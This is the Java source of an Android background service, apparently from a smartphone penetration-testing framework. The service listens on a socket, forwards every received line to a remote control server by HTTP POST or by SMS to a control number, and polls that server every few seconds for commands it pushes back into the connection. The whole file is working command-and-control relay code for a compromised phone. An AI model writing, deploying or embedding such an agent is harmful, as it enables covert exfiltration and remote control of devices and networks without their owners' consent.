package com.bulbsecurity.framework;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.Enumeration;

import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;

public class Listener extends Service {
	 // DEFAULT IP
    public static String SERVERIP = "10.0.2.15";
 
    // DESIGNATE A PORT
    public static int SERVERPORT = 8080;
    InputStream nis;
    OutputStream nos;
    File file2;
    private Handler handler = new Handler();
    String RETURNMETHOD = "HTTP";
 
    private ServerSocket serverSocket;
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onStart(Intent intent, int startID) {
		Log.i("AAAA","Listener started");
		SERVERPORT = intent.getIntExtra("port", 8080);
		SERVERIP = getLocalIpAddress();
		RETURNMETHOD = intent.getStringExtra("return");
		 
        Thread fst = new Thread(new ServerThread());
        fst.start();
       if (RETURNMETHOD.equals("HTTP"))
       {
      Thread outthread = new Thread(new Output());
      outthread.start();
       }
       else if (RETURNMETHOD.equals("SMS"))
       {
    	   Log.i("FFF", "SMS");
    	   String slasher = "/";
    	   String file = slasher.concat(String.valueOf(SERVERPORT));
    	    file2 = new File(getApplicationContext().getFilesDir() + file);
    	    try {
				file2.createNewFile();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
    	   Thread smsthread = new Thread(new SMSOut());
    	   smsthread.start();
    	   Log.i("FFFFF", "SMS check started");
       }
	}
	private String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) { return inetAddress.getHostAddress().toString(); }
                }
            }
        } catch (Exception ex) {
            Log.e("ServerActivity", ex.toString());
        }
        return null;
    }
	public void outputdata()
	{
		 String http = "http://";
 		 String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
 		 String path = getApplicationContext().getResources().getString(R.string.controlpath);
 		 String slash = "/";
 		 String port = String.valueOf(SERVERPORT);
 		 String control = "control";
 		String uri = http.concat(controlIP);
 		String uri2 = uri.concat(path);
 		String uri3 = uri2.concat(slash);
 		String uri4 = uri3.concat(port);
 		String pullfrom = uri4.concat(control);
 		Log.i("AAA", pullfrom);
 		URL url = null;
 		
 			try {
 				url = new URL(pullfrom);
 				BufferedReader input = new BufferedReader(new InputStreamReader(url.openStream()));
 				if (input != null)
 				{
 				
 				String inputLine;
 				while ((inputLine = input.readLine()) != null)
 				{
 				    Log.i("AAAA",inputLine);
 					PrintWriter output = new PrintWriter(nos); 
 					output.println(inputLine);
 					nos.flush();
 				}
 				
 				ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
				nameValuePairs.add(new BasicNameValuePair("text", ""));
			
					HttpClient httpclient = new DefaultHttpClient();
					String url2 = "controluploader.php";
					String slash1 = "/";
					String port1 = String.valueOf(SERVERPORT);
					String uri33 = http.concat(controlIP);
					String postto1 = uri33.concat(path);
					String lala = postto1.concat(slash1);
					String lala1 = lala.concat(port1);
					String postto = lala1.concat(url2);
					HttpPost httppost = new HttpPost(postto);
					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
					httpclient.
					execute(httppost);
 				}
 				
    	}catch(Exception e){

		e.printStackTrace();

		}	
	}
	public class SMSOut implements Runnable {
		 
        public void run() {
        	 while(true){
        		 Log.i("FFFFF", "SMS check");
        	 try {
        		
        			Thread.sleep(5000);
        		
				BufferedInputStream stream = new BufferedInputStream(new FileInputStream(file2));
				BufferedReader input = new BufferedReader(new InputStreamReader(stream));
 				if (input != null)
 				{
 					
 				String inputLine;
 				while ((inputLine = input.readLine()) != null)
 				{
 					Log.i("FFFFF", inputLine);
 					String inputLine2 = inputLine.concat("\n");
 					 nos.write(inputLine2.getBytes());
  					nos.flush();
  					
 				}
 				stream.close();
					file2.delete();
					file2.createNewFile();
 				
        	 }
 				stream.close();
        		 
        	 }catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
        	 
        	 }
        }
	}
	public class Output implements Runnable {
		 
        public void run() {
        	while(true)
        	{
        		try {
    				Thread.sleep(5000);
    			} catch (InterruptedException e1) {
    				// TODO Auto-generated catch block
    				e1.printStackTrace();
    			}
        	 String http = "http://";
     		 String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
     		 String path = getApplicationContext().getResources().getString(R.string.controlpath);
     		 String slash = "/";
     		 String port = String.valueOf(SERVERPORT);
     		 String control = "control";
     		String uri = http.concat(controlIP);
     		String uri2 = uri.concat(path);
     		String uri3 = uri2.concat(slash);
     		String uri4 = uri3.concat(port);
     		String pullfrom = uri4.concat(control);
     		Log.i("FFFFF", pullfrom);
     		URL url = null;
     		
     			try {
     				url = new URL(pullfrom);
     				BufferedReader input = new BufferedReader(new InputStreamReader(url.openStream()));
     				if (input != null)
     				{
     					Log.i("FFFFF", "input");
     				String inputLine;
     				while ((inputLine = input.readLine()) != null)
     				{
     				    Log.i("GGGGG",inputLine);
     				    String inputLine2 = inputLine.concat("\n");
     				   nos.write(inputLine2.getBytes());
     					nos.flush();
     				}
     				
     				ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
    				nameValuePairs.add(new BasicNameValuePair("text", ""));
    			
    					HttpClient httpclient = new DefaultHttpClient();
    					String url2 = "controluploader.php";
    					String slash1 = "/";
    					String port1 = String.valueOf(SERVERPORT);
    					String uri33 = http.concat(controlIP);
    					String postto1 = uri33.concat(path);
    					String lala = postto1.concat(slash1);
    					String lala1 = lala.concat(port1);
    					String postto = lala1.concat(url2);
    					HttpPost httppost = new HttpPost(postto);
    					httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    					httpclient.
    					execute(httppost);
     				}
     				
        	}catch(Exception e){

    		e.printStackTrace();

    		}	
        }}
        
        }
	
	
	public class ServerThread implements Runnable {
		 
        public void run() {
            try {
                if (SERVERIP != null) {
                    handler.post(new Runnable() {
                        public void run() {
                           Log.i("AAA","Listening on IP: " + SERVERIP);
                        }
                    });
                    serverSocket = new ServerSocket(SERVERPORT);
                    while (true) {
                        // LISTEN FOR INCOMING CLIENTS
                        Socket client = serverSocket.accept();
                        handler.post(new Runnable() {
                            public void run() {
                                Log.i("AAA","Connected.");
                                
                            }
                        });
                        nis = client.getInputStream();
                        nos = client.getOutputStream();
                     
                        	
                        try {
                         
                           
                            BufferedReader in = new BufferedReader(new InputStreamReader(nis));
                            String line = null;
                            while ((line = in.readLine()) != null) {
                            

                                Log.i("ServerActivity", line);
                                final String line2 = line;
                                final int SRVPRT = SERVERPORT;
                                handler.post(new Runnable() {
                                    public void run() {
                             
		if (RETURNMETHOD.equals("HTTP"))
		{
					try{
						ArrayList<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
						nameValuePairs.add(new BasicNameValuePair("text", line2));
				HttpClient httpclient = new DefaultHttpClient();
				String http = "http://";
				String controlIP = getApplicationContext().getResources().getString(R.string.controlIP);
				String path = getApplicationContext().getResources().getString(R.string.controlpath);
				String url1 = "/";
				String url2 = String.valueOf(SRVPRT);
				String url = "uploader.php";
				String uri = http.concat(controlIP);
				String postto1 = uri.concat(path);
				String posty = postto1.concat(url1);
				String posty2 = posty.concat(url2);
				String postto = posty2.concat(url);
				Log.i("AAA",postto);
				HttpPost httppost = new HttpPost(postto);
				httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
				httpclient.execute(httppost);
				}catch(Exception e){

				e.printStackTrace();

				}
		}
		else if (RETURNMETHOD.equals("SMS"))
		{
			Log.i("BBBB", "SMS send");
			String key = getApplicationContext().getResources().getString(R.string.key);
			String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
			String p = " PORT";
			String space = " ";
			String port = String.valueOf(SERVERPORT);
			String send1 = key.concat(p);
			String send22 = send1.concat(space);
			String send2 = send22.concat(port);
			String send3 = send2.concat(space);
			String send = send3.concat(line2);
			Intent intent3 = new Intent(getApplicationContext(),SMSService.class);
			intent3.putExtra("number", number2);
			intent3.putExtra("message", send);
			Context context = getApplicationContext();
			context.startService(intent3);
		}
		
			}
			
				
                                    
                                });
                            }
                            break;
                        } catch (Exception e) {
                            handler.post(new Runnable() {
                                public void run() {
                                    Log.i("AAA","Oops. Connection interrupted. Please reconnect your phones.");
                                }
                            });
                            e.printStackTrace();
                        }
                    }
                }
                 else {
                    handler.post(new Runnable() {
                        public void run() {
                            Log.i("AAA","Couldn't detect internet connection.");
                        }
                    });
                }
            } catch (Exception e) {
                handler.post(new Runnable() {
                    public void run() {
                       Log.i("AAA","Error");
                    }
                });
                e.printStackTrace();
            }
        }
    
	}	

}
